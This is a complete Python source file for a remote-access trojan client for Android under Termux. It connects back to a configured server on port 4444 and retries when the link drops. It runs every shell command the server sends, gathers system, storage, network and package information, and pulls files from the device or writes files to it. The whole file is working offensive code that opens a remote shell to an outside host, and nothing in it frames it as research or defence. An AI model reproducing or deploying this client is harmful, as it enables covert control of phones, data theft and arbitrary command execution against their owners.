#!/usr/bin/env python3
"""
RAT CLIENT FOR ANDROID (Termux)
Optimized for mobile devices
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time
import platform

# ================= CONFIGURATION =================
# GANTI DENGAN IP LAPTOP SERVER ANDA
SERVER_HOST = "192.168.1.100"  # IP laptop yang jalanin server
SERVER_PORT = 4444
# =================================================

class AndroidRATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        self.socket = None
        
    def reliable_send(self, data):
        """Send data to server"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False

    def reliable_receive(self):
        """Receive data from server"""
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except Exception as e:
            print(f"[!] Receive error: {e}")
            return None

    def connect_to_server(self):
        """Connect to RAT server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            print(f"✅ Connected to {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return False

    def execute_android_command(self, command):
        """Execute commands optimized for Android Termux"""
        try:
            # Change directory
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"📁 Directory: {os.getcwd()}"
            
            # Android/Termux specific commands
            elif command == 'pwd':
                return f"📁 Current: {os.getcwd()}"
            
            elif command in ['ls', 'dir']:
                result = subprocess.run('ls -la', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            elif command == 'sysinfo':
                info = {
                    'device': 'Android',
                    'system': platform.system(),
                    'platform': platform.platform(),
                    'processor': platform.processor(),
                    'current_user': os.getenv('USER') or 'termux',
                    'current_dir': os.getcwd(),
                    'storage_path': '/sdcard' if os.path.exists('/sdcard') else 'Not accessible'
                }
                return json.dumps(info, indent=2)
            
            elif command == 'storage':
                # Check accessible storage
                storage_locations = [
                    '/sdcard', '/storage', '/data/data/com.termux/files/home'
                ]
                result = "📱 Storage Info:\n"
                for location in storage_locations:
                    if os.path.exists(location):
                        try:
                            # Try to list first few items
                            items = os.listdir(location)[:5]
                            result += f"✅ {location}: {len(items)} items\n"
                        except:
                            result += f"❌ {location}: No permission\n"
                    else:
                        result += f"❌ {location}: Not found\n"
                return result
            
            elif command == 'termux-info':
                # Get Termux specific info
                try:
                    result = subprocess.run('termux-info', shell=True, capture_output=True, text=True)
                    return result.stdout if result.stdout else "termux-info not available"
                except:
                    return "Termux specific commands not available"
            
            elif command == 'packages':
                # List installed packages in Termux
                try:
                    result = subprocess.run('pkg list-installed', shell=True, capture_output=True, text=True)
                    packages = [pkg.split('/')[0] for pkg in result.stdout.split('\n') if pkg]
                    return f"📦 Installed packages: {', '.join(packages[:10])}..." if len(packages) > 10 else f"📦 Installed: {', '.join(packages)}"
                except:
                    return "Cannot list packages"
            
            elif command == 'network':
                # Network information for Android
                try:
                    result = subprocess.run('ip addr show', shell=True, capture_output=True, text=True)
                    return result.stdout if result.stdout else "Network info not available"
                except:
                    return "Cannot get network info"
            
            elif command.startswith('download '):
                # File download from Android
                filename = command[9:].strip()
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    return f"FILE:{filename}:{file_data}"
                else:
                    return f"❌ File not found: {filename}"
            
            elif command.startswith('upload '):
                # File upload to Android (basic implementation)
                parts = command[7:].split(':', 1)
                if len(parts) == 2:
                    filename, file_data = parts
                    try:
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(file_data))
                        return f"✅ Uploaded: {filename}"
                    except Exception as e:
                        return f"❌ Upload failed: {e}"
                return "❌ Invalid upload format"
            
            # Execute any shell command
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                return output if output else "✅ Command executed"
                
        except Exception as e:
            return f"❌ Command error: {str(e)}"

    def start_client(self):
        """Main client loop for Android"""
        print("📱 Android RAT Client Starting...")
        print("=" * 40)
        print(f"Target: {self.server_host}:{self.server_port}")
        print("=" * 40)
        
        reconnect_attempts = 0
        max_reconnect_attempts = 5
        
        while reconnect_attempts < max_reconnect_attempts:
            try:
                if not self.connected:
                    print(f"🔄 Connecting... (Attempt {reconnect_attempts + 1}/{max_reconnect_attempts})")
                    if not self.connect_to_server():
                        reconnect_attempts += 1
                        time.sleep(10)  # Wait 10 seconds
                        continue
                
                # Reset counter on successful connection
                reconnect_attempts = 0
                print("✅ Connected! Waiting for commands...")
                
                while self.connected:
                    # Receive command from server
                    command = self.reliable_receive()
                    if not command:
                        print("❌ Server disconnected")
                        self.connected = False
                        break
                    
                    if command.lower() in ['exit', 'quit']:
                        print("👋 Disconnecting by server request")
                        return
                    
                    print(f"📨 Received command: {command}")
                    
                    # Execute command and send result
                    result = self.execute_android_command(command)
                    if not self.reliable_send(result):
                        self.connected = False
                        break
                        
            except socket.timeout:
                print("⏰ Connection timeout")
                self.connected = False
            except KeyboardInterrupt:
                print("\n🛑 Client stopped by user")
                break
            except Exception as e:
                print(f"💥 Client error: {e}")
                self.connected = False
                reconnect_attempts += 1
                time.sleep(10)
        
        if reconnect_attempts >= max_reconnect_attempts:
            print("❌ Max reconnection attempts reached")

    def cleanup(self):
        """Cleanup resources"""
        if self.socket:
            self.socket.close()
        print("🧹 Client cleaned up")

def main():
    """Main function"""
    client = AndroidRATClient(SERVER_HOST, SERVER_PORT)
    
    try:
        client.start_client()
    except KeyboardInterrupt:
        print("\n🛑 Stopping client...")
    finally:
        client.cleanup()

if __name__ == "__main__":
    main()